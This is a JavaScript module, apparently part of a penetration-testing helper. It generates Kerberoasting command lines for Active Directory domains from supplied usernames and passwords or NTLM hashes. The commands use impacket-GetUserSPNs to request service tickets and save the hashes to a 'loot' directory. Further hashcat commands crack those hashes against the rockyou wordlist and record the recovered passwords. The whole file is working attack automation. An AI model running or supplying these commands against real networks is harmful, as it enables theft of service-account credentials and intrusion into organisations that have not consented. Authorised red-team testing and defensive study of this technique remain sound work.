const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

const identityFolder = (domain, username) =>
  `${domain}_${username}`.replace(/[^a-zA-Z0-9._@-]+/g, "_").replace(/^_+|_+$/g, "");

const credentialCandidates = (accounts, variables) => [
  {
    id: "command-context",
    domain: variables.domain,
    username: variables.user,
    secret: variables.password?.trim() || variables.hash?.trim(),
  },
  ...accounts,
];

export function buildSpnTgsCommands(accounts = [], variables = {}) {
  const commands = [];
  const seen = new Set();

  for (const account of credentialCandidates(accounts, variables)) {
    const domain = account.domain?.trim();
    const username = account.username?.trim();
    const secret = account.secret?.trim();
    if (!domain || !username || !secret) continue;

    const dedupeKey = `${domain.toLowerCase()}\u0000${username.toLowerCase()}\u0000${secret}`;
    if (seen.has(dedupeKey)) continue;
    seen.add(dedupeKey);

    const identity = `${domain}\\${username}`;
    const folder = identityFolder(domain, username);
    const loot = `{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs/${folder}`;
    const isHash = /^[a-f0-9]{32}$/i.test(secret);
    const target = shellQuote(`${domain}/${username}${isHash ? "" : `:${secret}`}`);
    const hashAuth = isHash ? ` -hashes ${shellQuote(`:${secret}`)}` : "";

    commands.push({
      key: `spn-tgs-request-${account.id ?? folder}`,
      label: `Enumerate SPNs and save TGS hashes — ${identity}`,
      value: `loot="${loot}"; mkdir -p "$loot"; impacket-GetUserSPNs ${target}${hashAuth} -dc-ip {{rhost}} -request -outputfile "$loot/tgs.hashes" | tee "$loot/spn-enumeration.txt"; printf '\n[*] Saved %s ticket hash(es) under %s\n' "$(grep -c '^\\$krb5tgs\\$' "$loot/tgs.hashes" 2>/dev/null || true)" "$loot"`,
    });

    commands.push({
      key: `spn-tgs-crack-${account.id ?? folder}`,
      label: `Crack saved TGS hashes — ${identity}`,
      value: `loot="${loot}"; hashes="$loot/tgs.hashes"; test -s "$hashes" || { echo "No TGS hashes found at $hashes"; exit 1; }; if grep -qF '$krb5tgs$23$' "$hashes"; then mode=13100; elif grep -qF '$krb5tgs$17$' "$hashes"; then mode=19600; elif grep -qF '$krb5tgs$18$' "$hashes"; then mode=19700; else echo 'Unsupported TGS format'; exit 1; fi; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; hashcat -m "$mode" "$hashes" /usr/share/wordlists/rockyou.txt --session "{{targetName}}-${folder}-tgs"; hashcat -m "$mode" "$hashes" --show | tee "$loot/cracked.txt"`,
    });
  }

  return commands;
}
